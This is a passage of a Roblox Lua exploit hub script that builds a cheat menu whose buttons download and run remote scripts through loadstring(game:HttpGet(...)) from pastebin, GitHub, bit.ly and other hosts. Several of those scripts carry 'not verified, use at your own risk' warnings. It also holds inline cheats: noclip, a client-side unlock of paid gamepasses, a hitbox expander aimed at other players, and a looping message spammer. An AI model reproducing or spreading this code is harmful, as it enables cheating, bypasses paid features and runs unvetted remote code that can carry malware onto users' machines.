		if string.find(v.Name, plxr) then
			return v
		elseif v.Name:sub(1, plxr:len()):lower()== plxr:lower() then
			return v
		end
	end
end
local plr = getplr(username.Text)
	game.Players.LocalPlayer.Character:MoveTo(plr.Character.Torso.Position)
end)

username.Name = "username"
username.Parent = tele
username.BackgroundColor3 = Color3.new(0, 1, 0.164706)
username.BorderColor3 = Color3.new(1, 1, 1)
username.BorderSizePixel = 2
username.Position = UDim2.new(0, 0, -1.4375, 0)
username.Size = UDim2.new(0, 135, 0, 37)
username.Font = Enum.Font.SourceSans
username.Text = "Username"
username.TextColor3 = Color3.new(0, 0, 0)
username.TextSize = 14

noclipon.Name = "noclipon"
noclipon.Parent = main
noclipon.BackgroundColor3 = Color3.new(0, 1, 0.164706)
noclipon.BorderColor3 = Color3.new(1, 1, 1)
noclipon.BorderSizePixel = 2
noclipon.Position = UDim2.new(0.719135821, 0, 0.356964082, 0)
noclipon.Size = UDim2.new(0, 91, 0, 32)
noclipon.Visible = false
noclipon.Font = Enum.Font.Fantasy
noclipon.Text = "Noclip: ON"
noclipon.TextColor3 = Color3.new(0, 0, 0)
noclipon.TextSize = 14
noclipon.MouseButton1Click:Connect(function()
	noclipoff.Visible = true
	noclipon.Visible = false
	local noclip = true char = game.Players.LocalPlayer.Character while true do if noclip == true then for _,v in pairs(char:children()) do pcall(function() if v.className == "Part" then v.CanCollide = true elseif v.ClassName == "Model" then v.Head.CanCollide = true end end) end end game:service("RunService").Stepped:wait() end
end)

noclipoff.Name = "noclipoff"
noclipoff.Parent = main
noclipoff.BackgroundColor3 = Color3.new(1, 0, 0)
noclipoff.BorderColor3 = Color3.new(1, 1, 1)
noclipoff.BorderSizePixel = 2
noclipoff.Position = UDim2.new(0.719135821, 0, 0.356964082, 0)
noclipoff.Size = UDim2.new(0, 91, 0, 32)
noclipoff.Font = Enum.Font.Fantasy
noclipoff.Text = "Noclip: OFF"
noclipoff.TextColor3 = Color3.new(0, 0, 0)
noclipoff.TextSize = 14
noclipoff.MouseButton1Click:Connect(function()
	noclipon.Visible = true
	noclipoff.Visible = false
	local noclip = true char = game.Players.LocalPlayer.Character while true do if noclip == true then for _,v in pairs(char:children()) do pcall(function() if v.className == "Part" then v.CanCollide = false elseif v.ClassName == "Model" then v.Head.CanCollide = false end end) end end game:service("RunService").Stepped:wait() end
end)

gamepassoff.Name = "gamepassoff"
gamepassoff.Parent = main
gamepassoff.BackgroundColor3 = Color3.new(1, 0, 0)
gamepassoff.BorderColor3 = Color3.new(1, 1, 1)
gamepassoff.BorderSizePixel = 2
gamepassoff.Position = UDim2.new(0.358024687, 0, 0.357164294, 0)
gamepassoff.Size = UDim2.new(0, 91, 0, 32)
gamepassoff.Font = Enum.Font.Fantasy
gamepassoff.Text = "Gamepass: OFF"
gamepassoff.TextColor3 = Color3.new(0, 0, 0)
gamepassoff.TextSize = 14
gamepassoff.MouseButton1Click:Connect(function()
	game.Players.LocalPlayer.Information.Gamepasses.FaceChanger.Value = true
game.Players.LocalPlayer.Information.Gamepasses.Vanish.Value = true
game.Players.LocalPlayer.Information.Gamepasses.Cloner.Value = true
game.Players.LocalPlayer.Information.Gamepasses.InstantHide.Value = true
game.Players.LocalPlayer.Information.Gamepasses.Radar.Value = true
game.Players.LocalPlayer.Information.Gamepasses.Walkspeed.Value = true
game.Players.LocalPlayer.Information.Gamepasses.AutoSeeker.Value = true
game.Players.LocalPlayer.Information.Gamepasses.SeekerPoints.Value = true
gamepasson.Visible = true
gamepassoff.Visible = false
end)

afkoff.Name = "afkoff"
afkoff.Parent = main
afkoff.BackgroundColor3 = Color3.new(1, 0, 0)
afkoff.BorderColor3 = Color3.new(1, 1, 1)
afkoff.BorderSizePixel = 2
afkoff.Position = UDim2.new(0, 0, 0.357164294, 0)
afkoff.Size = UDim2.new(0, 91, 0, 32)
afkoff.Font = Enum.Font.Fantasy
afkoff.Text = "AFK: OFF"
afkoff.TextColor3 = Color3.new(0, 0, 0)
afkoff.TextSize = 14
afkoff.MouseButton1Click:connect(function()
	game.Players.LocalPlayer.Information.AFK.Value = true
	afkon.Visible = true
	afkoff.Visible = false
end)

credits.Name = "credits"
credits.Parent = main
credits.BackgroundColor3 = Color3.new(0, 1, 0.164706)
credits.BorderColor3 = Color3.new(1, 1, 1)
credits.BorderSizePixel = 3
credits.Position = UDim2.new(-0.000110002235, 0, 0.937165141, 0)
credits.Size = UDim2.new(0, 131, 0, 24)
credits.Font = Enum.Font.Cartoon
credits.Text = "Credits: Psykek "
credits.TextColor3 = Color3.new(0, 0, 0)
credits.TextSize = 14
-- Scripts:
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

local Tab24 = Window:MakeTab({
	Name = "Searcher",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab24:AddButton({
	Name = "ScriptBlox Searcher",
	Callback = function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/ScriptSearcher"))()
      		print("button pressed")
  	end    
})

local Tab25 = Window:MakeTab({
	Name = "Sky-Hubs",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab25:AddButton({
	Name = "Sky-hub But FE",
	Callback = function()
	loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Fe-trolling-gui-11739"))()
      		print("button pressed")
  	end    
})

Tab25:AddButton({
	Name = "Sky-Hub Fluent Ui",
	Callback = function()
	loadstring(game:HttpGet("https://pastebin.com/raw/4uETPKhN"))();
      		print("button pressed")
  	end    
})

Tab25:AddButton({
	Name = "Sky-hub CE Ui",
	Callback = function()
--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/SkyHub.txt"))()
      		print("button pressed")
  	end    
})

local Tab26 = Window:MakeTab({
	Name = "T-O-H",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab26:AddButton({
	Name = "TowerOfExploitz",
	Callback = function()
-- Script Here
loadsting(game:HttpGet("https://pastebin.com/raw/2QnFtZef"))()
      		print("button pressed")
  	end    
})

Tab26:AddButton({
	Name = "RexTop By GearV4",
	Callback = function()
-- Script Here
loadstring(game:HttpGet("https://raw.githubusercontent.com/GearV4/RexTop/main/Gg",true))();
      		print("button pressed")
  	end    
})

local Tab27 = Window:MakeTab({
	Name = "Prison Life",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab27:AddButton({
	Name = "Impact Hub",
	Callback = function()
-- Script Here
loadstring(game:HttpGet("https://raw.githubusercontent.com/NoobExploits/Impact/main/Load.lua"))();
      		print("button pressed")
  	end    
})

Tab27:AddButton({
	Name = "Error | Hub",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/GearV4/Error-Hub/main/ErrorHub.lua"))();
      		print("button pressed")
  	end    
})

Tab27:AddButton({
	Name = "X-Rawnder v14",
	Callback = function()
-- Script Here
loadstring(game:HttpGet("https://bit.ly/x-Rawnder"))();
      		print("button pressed")
  	end    
})

Tab27:AddButton({
	Name = "BrainFucked Hub",
	Callback = function()
-- Script Here
loadstring(game:HttpGet("https://raw.githubusercontent.com/GearV4/BrainFucked-Hub/main/Brainfuck.lua"))();
      		print("button pressed")
  	end    
})

Tab27:AddButton({
	Name = "Prison Ware P/W",
	Callback = function()
-- Script Here
loadstring(game:HttpGet("https://raw.githubusercontent.com/Denverrz/scripts/master/PRISONWARE_v1.3.txt"))();
      		print("button pressed")
  	end    
})

Tab27:AddButton({
	Name = "TigerAdmin (Unpatched Modded)",
	Callback = function()
loadstring(game:HttpGet("https://scriptblox.com/raw/Prison-Life-tiger-admin-Feb-1-working-10302"))()
      		print("button pressed")
  	end    
})

local Tab28 = Window:MakeTab({
	Name = "Combat",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab28:AddButton({
	Name = "GearTycoon (Direct Comabat)",
	Callback = function()
-- Script Here
loadstring(game:HttpGet("https://raw.githubusercontent.com/GearV4/GearTycoon-V3/main/GearTycoon", true))()
      		print("button pressed")
  	end    
})

Tab28:AddButton({
	Name = "Battle Hub v1.9",
	Callback = function()
-- Script Here
loadstring(game:HttpGet("https://raw.githubusercontent.com/GearV4/Battle-Hub-v1.9/main/Battle%20Hub%20v1.9"))();
      		print("button pressed")
  	end    
})

Tab28:AddButton({
	Name = "Speed Script",
	Callback = function()
-- Script Here
loadstring(game:HttpGet("https://pastefy.app/RE2xabuD/raw"))();
      		print("button pressed")
  	end    
})

Tab28:AddButton({
	Name = "hitbox Script",
	Callback = function()
_G.HeadSize = 50
_G.Disabled = true
 
game:GetService('RunService').RenderStepped:connect(function()
if _G.Disabled then
for i,v in next, game:GetService('Players'):GetPlayers() do
if v.Name ~= game:GetService('Players').LocalPlayer.Name then
pcall(function()
v.Character.HumanoidRootPart.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize)
v.Character.HumanoidRootPart.Transparency = 0.7
v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Really blue")
v.Character.HumanoidRootPart.Material = "Neon"
v.Character.HumanoidRootPart.CanCollide = false
end)
end
end
end
end)
      		print("button pressed")
  	end    
})

Tab28:AddButton({
	Name = "ESP v1",
	Callback = function()
-- Script Here
loadstring(game:HttpGet('https://raw.githubusercontent.com/Lucasfin000/SpaceHub/main/UESP'))()
      		print("button pressed")
  	end    
})

Tab28:AddButton({
	Name = "ESP v2",
	Callback = function()
-- Script Here
loadstring(game:HttpGet('https://pastefy.app/eKmh5Xdd/raw'))()
      		print("button pressed")
  	end    
})

Tab28:AddButton({
	Name = "Fly Gui",
	Callback = function()
-- Script Here
loadstring(game:HttpGet("https://pastefy.app/M0N30XXG/raw"))();
      		print("button pressed")
  	end    
})

local Tab29 = Window:MakeTab({
	Name = "PANEL",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab29:AddButton({
	Name = "infinite yield panel",
	Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
      		print("button pressed")
  	end    
})

Tab29:AddButton({
	Name = "internet panel",
	Callback = function()
--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
-- OUXIE DISCORD SERVER: https://discord.gg/6a3rAf9r8k

--[[ READ ME
it no longer works, unless you create your OWN api flash account.
]]

local internet = loadstring(game:HttpGet("https://raw.githubusercontent.com/SkireScripts/Ouxie/main/Utils/Internet.lua"))()
internet:access("") -- YOUR API FLASH ACCESS KEY

--[[
create an account and get your own access key @ https://apiflash.com/dashboard/access_keys
when you create a access key (for free) you only get 100 searches a month.
https://apiflash.com/dashboard/plans
]]
      		print("button pressed")
  	end    
})

Tab29:AddButton({
	Name = "Nameless Admin Panel",
	Callback = function()
-- Script Here
--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet('https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source'))()
      		print("button pressed")
  	end    
})

Tab29:AddButton({
	Name = "Pastefy Panel",
	Callback = function()
--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
local ui = loadstring(game:HttpGet("https://raw.githubusercontent.com/SkireScripts/Ouxie/main/Utils/Pastefy/Pastefy%20UI.lua"))()
ui:load()
-- the auth is set to `Null` so dont expect the scripts that you upload with this script to show on your account
      		print("button pressed")
  	end    
})

Tab29:AddButton({
	Name = "Mobile Panel (console)",
	Callback = function()
local console = loadstring(game:HttpGet("https://raw.githubusercontent.com/SkireScripts/Ouxie/main/Utils/Developer%20Console/Console%20UI.lua"))()
local ui = console:load()
--ui returns the screen gui if you wanna customize
      		print("button pressed")
  	end    
})

Tab29:AddButton({
	Name = "Sirius Admin Panel",
	Callback = function()
loadstring(game:HttpGet('https://sirius.menu/sirius'))()
      		print("button pressed")
  	end    
})

local Tab30 = Window:MakeTab({
	Name = "Active Gblade Versions",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab30:AddButton({
	Name = "Gblade V7",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/GearV4/Gblade-V7/main/GBLADE%20V7%20BY%20GEARV4"))();
      		print("button pressed")
  	end    
})

Tab30:AddButton({
	Name = "Gblade V6",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/GearV4/GBLADE-V6/main/GBlade%20v6"))();
      		print("button pressed")
  	end    
})

Tab30:AddButton({
	Name = "GBlade V5",
	Callback = function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/GearV4/GBlade-V5/main/GBlade%20V5"))();
      		print("button pressed")
  	end    
})

Tab30:AddButton({
	Name = "gblade v4",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/GearV4/Gblade-With-Key/main/Gblade"))();
      		print("button pressed")
  	end    
})

Tab30:AddButton({
	Name = "Gblade V1",
	Callback = function()
-- v1
loadstring(game:HttpGet("https://pastebin.com/raw/sTtcgtXA"))();
      		print("button pressed")
  	end    
})

Tab30:AddButton({
	Name = "Gblade V8",
	Callback = function()
-- v8
loadstring(game:HttpGet("https://raw.githubusercontent.com/GearV4/GBlade-obf/main/GBlade%20v8"))();
      		print("button pressed")
  	end    
})

Tab30:AddButton({
	Name = "Gblade V3",
	Callback = function()
-- v3
loadstring(game:HttpGet("https://pastebin.com/raw/0fQZn6ap"))();
      		print("button pressed")
  	end    
})

Tab30:AddButton({
	Name = "Gblade V2",
	Callback = function()
-- v2
loadstring(game:HttpGet("https://pastebin.com/raw/YAnF9rPv"))();
      		print("button pressed")
  	end    
})

Tab30:AddButton({
	Name = "Gblade Version X",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/GearV4/GbladeXobf/main/GBLADE.lua"))();
      		print("button pressed")
  	end    
})

Tab30:AddButton({
	Name = "Other Gblades Are Patch now",
	Callback = function()
-- None
      		print("button pressed")
  	end    
})

local Tab31 = Window:MakeTab({
	Name = "Trench War",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab31:AddButton({
	Name = "Trench War (Official GBLADE)",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/GearV4/Trench-war/main/TrenchWar.lua"))()
      		print("button pressed")
  	end    
})

Tab31:AddButton({
	Name = "Trench War (By Penguin)",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/bTaBiz91"))()
      		print("button pressed")
  	end    
})

Tab31:AddButton({
	Name = "Trench War (Credits to Owner)",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/7YKUr1ZV"))()
      		print("button pressed")
  	end    
})

local Tab32 = Window:MakeTab({
	Name = "Tycoon",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab32:AddButton({
	Name = "God Tycoon",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/MrWitzbold/GOD-TYCOON-GUI-script/main/main.lua"))()
      		print("button pressed")
  	end    
})

Tab32:AddButton({
	Name = "Legends of Speed 1",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/GearV4/Legends-Hub-V2/main/Legends%20Hub%20V2"))();
      		print("button pressed")
  	end    
})

Tab32:AddButton({
	Name = "Legends of Speed 2 (Turbo Hub)",
	Callback = function()
loadstring(Game:HttpGet"https://gitlab.com/turbohubz/loader.xyz/loader/-/raw/main/TurboHub-Loader")()
      		print("button pressed")
  	end    
})

Tab32:AddButton({
	Name = "Muscle Legends (Turbo Hub)",
	Callback = function()
loadstring(Game:HttpGet"https://gitlab.com/turbohubz/loader.xyz/loader/-/raw/main/TurboHub-Loader")()
      		print("button pressed")
  	end    
})

Tab32:AddButton({
	Name = "SuperHero Tycoon",
	Callback = function()
-- None
loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraIsMe/ToraIsMe/main/0superhero", true))()
      		print("button pressed")
  	end    
})

local Tab33 = Window:MakeTab({
	Name = "Natural Disaster",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab33:AddButton({
	Name = "Six-Hub",
	Callback = function()
-- None
loadstring(game:HttpGet('https://raw.githubusercontent.com/ySixxNz/Natural-Desastre/SIX-MENU/SIX-HUB-NATURAL-DESASTRE'))()
      		print("button pressed")
  	end    
})

Tab33:AddButton({
	Name = "Vortex",
	Callback = function()
-- None
loadstring(game:HttpGet('https://raw.githubusercontent.com/SmartModBoy/VortexAblity/main/SV'))()
      		print("button pressed")
  	end    
})

Tab33:AddButton({
	Name = "NDS Hub",
	Callback = function()
-- None
loadstring(game:HttpGet("https://pastebin.com/raw/X1z99YB7"))();
      		print("button pressed")
  	end    
})

Tab33:AddButton({
	Name = "NDS Hub V2",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/2dgeneralspam1/scripts-and-stuff/master/scripts/LoadstringUjHI6RQpz2o8", true))()
      		print("button pressed")
  	end    
})

local Tab34 = Window:MakeTab({
	Name = "DaHood",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab34:AddButton({
	Name = "Da-Hood (Nuker-Hub)",
	Callback = function()
	 -- Script Here!
	 loadstring(game:HttpGet("https://raw.githubusercontent.com/Allvideo/test/main/Whitelist.txt"))()
      		print("button pressed")
  	end    
})

Tab34:AddButton({
	Name = "Da-Hood (Error-Hub)",
	Callback = function()
	 -- Script Here!
	 loadstring(game:HttpGet("https://raw.githubusercontent.com/GearV4/Error-Hub-Dahood/main/Error%20Hub%20%7C%20Dahood.lua"))();
      		print("button pressed")
  	end    
})

Tab34:AddButton({
	Name = "Da-Hood (Primordial-hub)",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Bovanlaarhoven/Primordial/main/src/loader.lua"))()
      		print("button pressed")
  	end    
})

Tab34:AddButton({
	Name = "Da-Hood (DaHub)",
	Callback = function()
--   https://discord.gg/4sA3JQj5AK
loadstring(game:HttpGet("https://paste.myconan.net/489741.txt"))()
      		print("button pressed")
  	end    
})

Tab34:AddButton({
	Name = "Da-Hood (SwagMode)",
	Callback = function()
--   https://discord.gg/4sA3JQj5AK
--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SwagModeV002'))()
      		print("button pressed")
  	end    
})

Tab34:AddButton({
	Name = "Da-Hood (Silent Aim)",
	Callback = function()
--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet(('https://pastefy.app/OMYAFzxQ/raw'),true))()
      		print("button pressed")
  	end    
})

Tab34:AddButton({
	Name = "Da-Hood (G-Hood Official)",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/GearV4/G---Hood/main/G%20-%20Hood.lua"))();
      		print("button pressed")
  	end    
})

local Tab35 = Window:MakeTab({
	Name = "Meepcity",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab35:AddButton({
	Name = "MeepCity (MpCity Hub)",
	Callback = function()
	  --[[made by synolope ;)]] loadstring(game:HttpGet("https://raw.githubusercontent.com/synolope/mpcity/main/loader.lua",true))()
      		print("button pressed")
  	end    
})

Tab35:AddButton({
	Name = "Meepcity (Atomic x)",
	Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/yLegendzz/Scripts/main/Meepcity'))()
      		print("button pressed")
  	end    
})

Tab35:AddButton({
	Name = "Meepcity (MeepCracked)",
	Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/synolope/meepcracked/main/loader.lua'))()
local camera = workspace.CurrentCamera
local blurAmount = 10
local blurAmplifier = 5
local lastVector = camera.CFrame.LookVector

local motionBlur = Instance.new("BlurEffect", camera)

local runService = game:GetService("RunService")

workspace.Changed:Connect(function(property)
 if property == "CurrentCamera" then
  print("Changed")
  local camera = workspace.CurrentCamera
  if motionBlur and motionBlur.Parent then
   motionBlur.Parent = camera
  else
   motionBlur = Instance.new("BlurEffect", camera)
  end
 end
end)

runService.Heartbeat:Connect(function()
 if not motionBlur or motionBlur.Parent == nil then
  motionBlur = Instance.new("BlurEffect", camera)
 end
 
 local magnitude = (camera.CFrame.LookVector - lastVector).magnitude
 motionBlur.Size = math.abs(magnitude)*blurAmount*blurAmplifier/2
 lastVector = camera.CFrame.LookVector
end)
      		print("button pressed")
  	end    
})

Tab35:AddButton({
	Name = "Meepcity (MeepF_cker)",
	Callback = function()
	 loadstring(game:HttpGet("https://pastebin.com/raw/XL5m2bGb"))();
      		print("button pressed")
  	end    
})

Tab35:AddButton({
	Name = "MeepCity (AutoFarm)",
	Callback = function()
	 loadstring(game:HttpGet(('https://raw.githubusercontent.com/kilav3rm/Scripts/main/MeepCity'),true))()
      		print("button pressed")
  	end    
})

local Tab36 = Window:MakeTab({
	Name = "Premium Hacks",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab36:AddButton({
	Name = "DarkCheat [Premium]",
	Callback = function()
	 -- Script Here!
	 loadstring(game:HttpGet("https://raw.githubusercontent.com/VaniaPerets/FolderGui-FolderHub/main/loader.lua", true))()
      		print("button pressed")
  	end    
})

Tab36:AddButton({
	Name = "Pineapple Hub [Premium]",
	Callback = function()
	 -- Script Here!
	 loadstring(game:HttpGet("https://pastebin.com/raw/aCF052bC"))();
      		print("button pressed")
  	end    
})

Tab36:AddButton({
	Name = "Milenio-X [Premium]",
	Callback = function()
	 -- Script Here!
	 --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet("https://raw.githubusercontent.com/Nearz1/Milenio-X-Hub/main/Key%20System%20On%20Top"))()
      		print("button pressed")
  	end    
})

Tab36:AddButton({
	Name = "HG-Prem [Premium]",
	Callback = function()
	 -- Script Here!
	 --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet("https://raw.githubusercontent.com/HG-Chenxin/HG.HUB/main/Script.Lua"))()

-- Get Key In Discord Server : https://discord.gg/wq6MrxZRUa
      		print("button pressed")
  	end    
})

Tab36:AddButton({
	Name = "System VPrem [Premium]",
	Callback = function()
	 -- Script Here!
	 --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet('https://raw.githubusercontent.com/AHMEDPLPL/System-hub/main/System%20hub%20V2', true))();
      		print("button pressed")
  	end    
})

Tab36:AddButton({
	Name = "Macro Prem [Premium]",
	Callback = function()
	 -- Script Here!
	 --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet("https://raw.githubusercontent.com/Alt3rin/TTD/main/Farm"))()
      		print("button pressed")
  	end    
})

Tab36:AddButton({
	Name = "f0rtuit Hub Prem [Premium]",
	Callback = function()
	 -- Script Here! 
	 loadstring(game:HttpGet('https://raw.githubusercontent.com/scawy-haxor/-f0rtuit0us-hub/main/f0rtuit0us%20hub', true))();
      		print("button pressed")
  	end    
})

Tab36:AddButton({
	Name = "D4rk M0dz [Premium]",
	Callback = function()
	 -- Script Here
	 loadstring(game:HttpGet("https://gist.githubusercontent.com/dark-modz/6982de484735e730494b2d5a10fd6a2a/raw/a92563b0cd6a63683341a09f54baccea5349ed69/feGamepassV2",true))()
      		print("button pressed")
  	end    
})

Tab36:AddButton({
	Name = "Pie X Prem Leak [Premium]",
	Callback = function()
	 -- Script Here! 
	 loadstring(game:HttpGet("https://raw.githubusercontent.com/OfficialDex/-hub-x-ig-test-0.3/main/Pie%20x%20hub%20test%200.3%20ig"))()
      		print("button pressed")
  	end    
})

Tab36:AddButton({
	Name = "LoLix Premium [Premium]",
	Callback = function()
	 -- Script Here! 
	 loadstring(game:HttpGet("https://raw.githubusercontent.com/GearV4/Lolix-Hub/main/Lolix.lua"))();
      		print("button pressed")
  	end    
})

local Tab37 = Window:MakeTab({
	Name = "RandomScripts V2",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab37:AddButton({
	Name = "Venox.lua",
	Callback = function()
	 loadstring(game:HttpGet("https://raw.githubusercontent.com/GearV4/Venox/main/VenoX.lua"))();
      		print("button pressed")
  	end    
})

Tab37:AddButton({
	Name = "Ghost Hub (credits : Ghostplayer",
	Callback = function()
	 loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub'))()
      		print("button pressed")
  	end    
})

Tab37:AddButton({
	Name = "Keyboard Script (FE)",
	Callback = function()
	 loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
      		print("button pressed")
  	end    
})

Tab37:AddButton({
	Name = "REc00lgui (Credits : 007n7",
	Callback = function()
	 loadstring(game:GetObjects("rbxassetid://8127297852")[1].Source)()
      		print("button pressed")
  	end    
})

Tab37:AddButton({
	Name = "1x1x1x1 GUI ( Remade )",
	Callback = function()
	 loadstring(game:HttpGet('https://raw.githubusercontent.com/tyreltrijo/1x1/main/1x1x1x1'))()
      		print("button pressed")
  	end    
})

Tab37:AddButton({
	Name = "1x1x1x1 (Main GUI)",
	Callback = function()
	 -- Gui to Lua
-- Version: 3.
-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Name = Instance.new("TextLabel")
local Credits = Instance.new("TextLabel")
local e1x1x1x1Message = Instance.new("TextButton")
local e1x1x1x1Music = Instance.new("TextButton")
local e1x1x1x1Laugh = Instance.new("TextButton")
local DayToNight = Instance.new("TextButton")
local e666 = Instance.new("TextButton")
local EpicSaxGuy = Instance.new("TextButton")
local Disc0 = Instance.new("TextButton")
local e2006Theme = Instance.new("TextButton")
local ForceField = Instance.new("TextButton")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame.Position = UDim2.new(0.382171214, 0, 0.328530252, 0)
Frame.Size = UDim2.new(0, 378, 0, 250)

Name.Name = "Name"
Name.Parent = Frame
Name.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Name.Size = UDim2.new(0, 378, 0, 25)
Name.Font = Enum.Font.GothamBold
Name.Text = "1x1x1x1 Gui"
Name.TextColor3 = Color3.fromRGB(0, 0, 0)
Name.TextScaled = true
Name.TextSize = 14.000
Name.TextWrapped = true

Credits.Name = "Credits"
Credits.Parent = Frame
Credits.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Credits.Position = UDim2.new(0, 0, 0.912, 0)
Credits.Size = UDim2.new(0, 378, 0, 22)
Credits.Font = Enum.Font.GothamBold
Credits.Text = "By GearV4"
Credits.TextColor3 = Color3.fromRGB(0, 0, 0)
Credits.TextScaled = true
Credits.TextSize = 14.000
Credits.TextWrapped = true

e1x1x1x1Message.Name = "e1x1x1x1Message"
e1x1x1x1Message.Parent = Frame
e1x1x1x1Message.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
e1x1x1x1Message.Position = UDim2.new(0.0714285746, 0, 0.216000006, 0)
e1x1x1x1Message.Size = UDim2.new(0, 79, 0, 31)
e1x1x1x1Message.Font = Enum.Font.GothamBold
e1x1x1x1Message.Text = "1x1x1x1 Message"
e1x1x1x1Message.TextColor3 = Color3.fromRGB(0, 0, 0)
e1x1x1x1Message.TextScaled = true
e1x1x1x1Message.TextSize = 14.000
e1x1x1x1Message.TextWrapped = true
e1x1x1x1Message.MouseButton1Down:connect(function()
	while true do
		wait(12)--set this to how much time between messages
		msg = Instance.new ("Hint")
		msg.Parent = game.Workspace
		msg.Text = "1x1x1x1: MUHAWHAWHAW! NOOBS! I HAVE RETURNED FOR MY REVENGE!"
		wait(6)
		msg:remove()
		wait(3)
		msg = Instance.new("Message")
		msg.Parent = game.Workspace
		msg.Text = "1x1x1x1: NOW YOU WILL ALL PARISH IN MY FIRE OF DOOM!"
		wait(6)
		msg:remove()
		wait(3)
		msg = Instance.new("Message")
		msg.Parent = game.Workspace
		msg.Text = "1x1x1x1: I WILL DESTROY YOU ALL! YOU ARE WORTHLESS!"
		wait(6)
		msg:remove()
		wait(3)
		msg = Instance.new("Message")
		msg.Parent = game.Workspace
		msg.Text = "1x1x1x1: YOU WILL NOT LIVE THROUGH MY DEADLY ATTACKS!"
		wait(6)
		msg:remove()
		wait(3)
		msg = Instance.new("Message")
		msg.Parent = game.Workspace
		msg.Text = "GearV4: This Script is made By GearV4!"
		wait(6)
		msg:remove()
wait(3)
		msg = Instance.new("Message")
		msg.Parent = game.Workspace
		msg.Text = "GearV4: THE SCRIPT IS SKIDDED BY GEARV4!"
		wait(6)
		msg:remove()
wait(3)
		msg = Instance.new("Message")
		msg.Parent = game.Workspace
		msg.Text = "GearV4: For More Scripts join discord.gg/bypassers (:"
		wait(6)
		msg:remove()
		wait(3)
		msg = Instance.new("Message")
		msg.Parent = game.Workspace
		msg.Text = "1x1x1x1: AND THEN THOSE BOTS WILL DESTROY ROBLOX! HAHAHAHAHA!"
		wait(6)
		msg:remove()
		wait(3)
		msg = Instance.new("Message")
		msg.Parent = game.Workspace
		msg.Text = "1x1x1x1: YOU CAN'T STOP ME! THERES NOTHING YOU CAN DO!"
		wait(6)
		msg:remove()
	end
end)
e1x1x1x1Music.Name = "e1x1x1x1Music"
e1x1x1x1Music.Parent = Frame
e1x1x1x1Music.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
e1x1x1x1Music.Position = UDim2.new(0.0714285746, 0, 0.436000019, 0)
e1x1x1x1Music.Size = UDim2.new(0, 79, 0, 31)
e1x1x1x1Music.Font = Enum.Font.GothamBold
